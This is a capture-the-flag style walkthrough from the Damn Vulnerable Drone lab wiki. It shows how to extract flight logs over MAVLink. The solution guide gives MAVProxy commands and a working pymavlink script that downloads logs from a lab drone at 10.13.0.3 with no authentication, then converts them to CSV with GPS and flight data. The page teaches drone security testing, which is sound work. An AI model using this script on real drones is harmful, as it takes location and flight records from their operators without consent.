<i>Collecting and converting flight logs from an ArduPilot/MAVLink drone using MAVProxy and pymavlink, and converting them to CSV for analysis.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Exfiltration > Flight Log Extraction

# Description

The flight log extraction process involves collecting binary logs (BIN files) from an ArduPilot/MAVLink drone. This can be achieved using tools like MAVProxy or pymavlink scripts. After collecting the logs, they can be converted to a CSV format using pybinlog for easy viewing and analysis.

# Resources

- [MAVLink Protocol](https://mavlink.io/en/)
- [MAVProxy](https://ardupilot.github.io/MAVProxy/html/)
- [pymavlink](https://mavlink.io/en/mavgen_python/)
- [pybinlog](https://pypi.org/project/pybinlog/)

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

### Step 1. Setup MAVProxy

<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3-pip
pip3 install mavproxy
</code></pre>

---

### Step 2. Collect Logs Using MAVProxy

<pre><code class="code mb-3 mt-3">mavproxy.py --master=tcp:10.13.0.3:5760
</code></pre>

Inside MAVProxy:

<pre><code class="code mb-3 mt-3">log list
log download &lt;log_index&gt;
</code></pre>

---

### Step 3. Setup pymavlink

<pre><code class="code mb-3 mt-3">sudo apt-get install python3 python3-pip
pip3 install pymavlink scapy
</code></pre>

---

### Step 4. Collect Logs Using pymavlink

Create a script named `log-extract.py`:

<pre><code class="code mb-3 mt-3">import sys
from pymavlink import mavutil

def list_logs(connection):
    connection.mav.log_request_list_send(
        connection.target_system, 
        connection.target_component, 
        0, 0xffff
    )

    logs = []
    while True:
        msg = connection.recv_match(type=['LOG_ENTRY'], blocking=True, timeout=5)
        if msg is None:
            break
        logs.append(msg)
    return logs

def download_log(connection, log_id, log_size, filename):
    with open(filename, 'wb') as file:
        bytes_received = 0
        ofs = 0
        while bytes_received &lt; log_size:
            connection.mav.log_request_data_send(
                connection.target_system,
                connection.target_component,
                log_id,
                ofs,
                90
            )
            while True:
                msg = connection.recv_match(type=['LOG_DATA'], blocking=True, timeout=5)
                if msg is None:
                    break
                if msg.id != log_id or msg.ofs != ofs:
                    continue
                data = bytes(msg.data)
                file.write(data)
                bytes_received += len(data)
                ofs += len(data)
                print(f"Received {bytes_received}/{log_size} bytes")
                break

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python log-extract.py &lt;connection_string&gt; &lt;log_id&gt;")
        sys.exit(1)

    connection_string = sys.argv[1]
    log_id = int(sys.argv[2])

    connection = mavutil.mavlink_connection(connection_string)
    connection.wait_heartbeat()

    logs = list_logs(connection)
    for log in logs:
        print(f"Log ID: {log.id}, Size: {log.size}, Time: {log.time_utc}")

    log_to_download = next((log for log in logs if log.id == log_id), None)
    if log_to_download:
        download_log(connection, log_to_download.id, log_to_download.size, f"log_{log_id}.bin")
        print(f"Log {log_id} downloaded successfully.")
    else:
        print(f"Log ID {log_id} not found.")
</code></pre>

Run it:

<pre><code class="code mb-3 mt-3">python log-extract.py tcp:10.13.0.3:5760 1
</code></pre>

---

### Step 5. Convert Logs to CSV

Install pybinlog:

<pre><code class="code mb-3 mt-3">pip3 install pybinlog
</code></pre>

Convert BIN to CSV:

<pre><code class="code mb-3 mt-3">bin2csv -o logs_csv log_1.bin
</code></pre>

---

### Step 6. Analyze CSV Logs

Open `.csv` files using Excel, pandas, or Jupyter.  
Examples include:

- `GPS-log1.csv` → GPS position, speed, satellite count
- `ATT-log1.csv` → Roll, Pitch, Yaw
- `MODE-log1.csv` → Mode transitions
- `BAT-log1.csv` → Battery usage
- `CTUN-log1.csv` → PID loop data

(Full table of log types available upon request)

</details>
